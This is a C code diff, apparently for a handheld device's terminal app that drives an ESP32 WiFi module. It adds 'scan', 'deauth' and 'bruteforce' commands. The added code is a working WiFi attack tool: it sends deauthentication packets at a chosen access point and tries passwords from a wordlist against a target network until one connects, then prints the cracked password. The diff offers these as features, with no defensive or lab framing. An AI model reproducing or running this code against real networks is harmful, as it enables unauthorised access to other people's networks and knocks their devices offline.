@@ -254,6 +254,9 @@ static void cmd_help(TerminalApp* app) {
     terminal_println(app, " pass <p>   - set WiFi pass");
     terminal_println(app, " connect    - join WiFi");
     terminal_println(app, " wget <url> <file>");
+    terminal_println(app, " scan        - scan WiFi nets");
+    terminal_println(app, " deauth <bssid>");
+    terminal_println(app, " bruteforce <ssid> [wl]");
     terminal_println(app, " pkg         - package manager");
 }
 
@@ -695,6 +698,236 @@ static void cmd_wget(TerminalApp* app, const char* args) {
     } else {
         storage_simply_remove(app->storage, dest);
         terminal_println(app, "Download failed");
+    }
+}
+
+// --- WiFi Scan & Brute Force ---
+
+static void cmd_scan(TerminalApp* app) {
+    if(!app->wifi.serial || !app->wifi.detected) {
+        terminal_println(app, "No WiFi module. Use 'ping'");
+        return;
+    }
+
+    terminal_println(app, "Scanning networks...");
+    wifi_flush(&app->wifi);
+    wifi_send(&app->wifi, "WIFI_SCAN\r\n");
+
+    // Read scan results line by line until DONE or timeout
+    char resp[128];
+    uint32_t count = 0;
+
+    while(count < 32) {
+        size_t len = wifi_read_line(&app->wifi, resp, sizeof(resp), 10000);
+        if(len == 0) break;
+        if(strcmp(resp, "DONE") == 0) break;
+        if(strncmp(resp, "ERROR:", 6) == 0) {
+            terminal_printf(app, "Scan error: %s\n", resp + 6);
+            return;
+        }
+        // Format from ESP32: RSSI|CHANNEL|ENCRYPTION|SSID
+        terminal_printf(app, " %s\n", resp);
+        count++;
+    }
+
+    if(count == 0) {
+        terminal_println(app, "No networks found");
+    } else {
+        terminal_printf(app, "%lu networks found\n", count);
+    }
+}
+
+static void cmd_deauth(TerminalApp* app, const char* args) {
+    if(!app->wifi.serial || !app->wifi.detected) {
+        terminal_println(app, "No WiFi module. Use 'ping'");
+        return;
+    }
+    if(!args || strlen(args) == 0) {
+        terminal_println(app, "usage: deauth <bssid> [count]");
+        terminal_println(app, " bssid: target AP MAC");
+        terminal_println(app, " count: packets (default 50)");
+        return;
+    }
+
+    wifi_flush(&app->wifi);
+    char cmd[256];
+    snprintf(cmd, sizeof(cmd), "WIFI_DEAUTH %s\r\n", args);
+    wifi_send(&app->wifi, cmd);
+
+    char resp[128];
+    size_t len = wifi_read_line(&app->wifi, resp, sizeof(resp), WIFI_CMD_TIMEOUT_MS);
+    if(len > 0) {
+        terminal_printf(app, "%s\n", resp);
+    } else {
+        terminal_println(app, "No response");
+    }
+}
+
+static void cmd_bruteforce(TerminalApp* app, const char* args) {
+    if(!app->wifi.serial || !app->wifi.detected) {
+        terminal_println(app, "No WiFi module. Use 'ping'");
+        return;
+    }
+    if(!args || strlen(args) == 0) {
+        terminal_println(app, "WiFi Brute Force");
+        terminal_println(app, "usage: bruteforce <ssid> [wordlist]");
+        terminal_println(app, "");
+        terminal_println(app, " ssid: target network name");
+        terminal_println(app, " wordlist: path to password file");
+        terminal_println(app, "   default: /ext/wordlists/passwords.txt");
+        terminal_println(app, "");
+        terminal_println(app, "Wordlist format: one password per line");
+        terminal_println(app, "Press Back in menu to abort");
+        return;
+    }
+
+    // Parse SSID and optional wordlist path
+    char ssid[64];
+    char wordlist_path[DIR_NAME_MAX];
+
+    const char* space = strchr(args, ' ');
+    if(space) {
+        size_t slen = space - args;
+        if(slen >= sizeof(ssid)) slen = sizeof(ssid) - 1;
+        memcpy(ssid, args, slen);
+        ssid[slen] = '\0';
+
+        const char* wl = space + 1;
+        while(*wl == ' ') wl++;
+        resolve_path(app, wl, wordlist_path, sizeof(wordlist_path));
+    } else {
+        strlcpy(ssid, args, sizeof(ssid));
+        strlcpy(wordlist_path, EXT_PATH("wordlists/passwords.txt"), sizeof(wordlist_path));
+    }
+
+    // Open wordlist
+    File* file = storage_file_alloc(app->storage);
+    if(!storage_file_open(file, wordlist_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
+        terminal_printf(app, "Cannot open: %s\n", wordlist_path);
+        terminal_println(app, "Create a wordlist file with");
+        terminal_println(app, "one password per line.");
+        storage_file_free(file);
+        return;
+    }
+
+    terminal_printf(app, "Target: %s\n", ssid);
+    terminal_printf(app, "Wordlist: %s\n", wordlist_path);
+    terminal_println(app, "Starting brute force...");
+
+    // Set the target SSID on the ESP32
+    wifi_flush(&app->wifi);
+    char cmd[256];
+    snprintf(cmd, sizeof(cmd), "WIFI_SSID %s\r\n", ssid);
+    wifi_send(&app->wifi, cmd);
+    char resp[128];
+    wifi_read_line(&app->wifi, resp, sizeof(resp), WIFI_CMD_TIMEOUT_MS);
+
+    // Read passwords one line at a time and try each
+    char password[128];
+    size_t pw_pos = 0;
+    char ch;
+    uint32_t attempt = 0;
+    bool found = false;
+
+    while(!found) {
+        size_t bytes_read = storage_file_read(file, &ch, 1);
+
+        bool process_line = false;
+        if(bytes_read == 0) {
+            // EOF
+            if(pw_pos > 0) {
+                password[pw_pos] = '\0';
+                process_line = true;
+            } else {
+                break;
+            }
+        } else if(ch == '\n') {
+            password[pw_pos] = '\0';
+            pw_pos = 0;
+            process_line = true;
+        } else if(ch != '\r') {
+            if(pw_pos < sizeof(password) - 1) {
+                password[pw_pos++] = ch;
+            }
+            continue;
+        } else {
+            continue;
+        }
+
+        if(!process_line) {
+            if(bytes_read == 0) break;
+            continue;
+        }
+
+        // Trim whitespace
+        size_t plen = strlen(password);
+        while(plen > 0 &&
+              (password[plen - 1] == ' ' || password[plen - 1] == '\t')) {
+            password[--plen] = '\0';
+        }
+
+        // Skip empty lines and comments
+        if(plen == 0 || password[0] == '#') {
+            if(bytes_read == 0) break;
+            pw_pos = 0;
+            continue;
+        }
+
+        // Skip passwords shorter than 8 chars (WPA minimum)
+        if(plen < 8) {
+            if(bytes_read == 0) break;
+            pw_pos = 0;
+            continue;
+        }
+
+        attempt++;
+
+        // Show progress every attempt
+        if(attempt % 5 == 1) {
+            terminal_printf(app, "[%lu] %s\n", attempt, password);
+        }
+
+        // Send password to ESP32
+        wifi_flush(&app->wifi);
+        snprintf(cmd, sizeof(cmd), "WIFI_PASS %s\r\n", password);
+        wifi_send(&app->wifi, cmd);
+        wifi_read_line(&app->wifi, resp, sizeof(resp), WIFI_CMD_TIMEOUT_MS);
+
+        // Try to connect
+        wifi_flush(&app->wifi);
+        wifi_send(&app->wifi, "WIFI_CONNECT\r\n");
+
+        // Wait for result (shorter timeout for brute force)
+        size_t rlen = wifi_read_line(&app->wifi, resp, sizeof(resp), 8000);
+
+        if(rlen > 0 && strstr(resp, "CONNECTED")) {
+            found = true;
+            app->wifi.connected = true;
+            terminal_println(app, "");
+            terminal_println(app, "=============================");
+            terminal_printf(app, "PASSWORD FOUND!\n");
+            terminal_printf(app, "SSID: %s\n", ssid);
+            terminal_printf(app, "Pass: %s\n", password);
+            terminal_printf(app, "Attempts: %lu\n", attempt);
+            terminal_println(app, "=============================");
+            break;
+        }
+
+        // Disconnect before next attempt
+        wifi_flush(&app->wifi);
+        wifi_send(&app->wifi, "WIFI_DISCONNECT\r\n");
+        wifi_read_line(&app->wifi, resp, sizeof(resp), 2000);
+
+        pw_pos = 0;
+        if(bytes_read == 0) break;
+    }
+
+    storage_file_close(file);
+    storage_file_free(file);
+
+    if(!found) {
+        terminal_printf(app, "\nExhausted %lu passwords\n", attempt);
+        terminal_println(app, "Password not found");
     }
 }
 
@@ -1519,6 +1752,12 @@ static void terminal_execute(TerminalApp* app, const char* input) {
         cmd_wifi_connect(app);
     } else if(strcmp(cmd, "wget") == 0) {
         cmd_wget(app, args);
+    } else if(strcmp(cmd, "scan") == 0) {
+        cmd_scan(app);
+    } else if(strcmp(cmd, "deauth") == 0) {
+        cmd_deauth(app, args);
+    } else if(strcmp(cmd, "bruteforce") == 0 || strcmp(cmd, "brute") == 0) {
+        cmd_bruteforce(app, args);
     } else if(strcmp(cmd, "pkg") == 0 || strcmp(cmd, "apt") == 0) {
         cmd_pkg(app, args);
     } else {
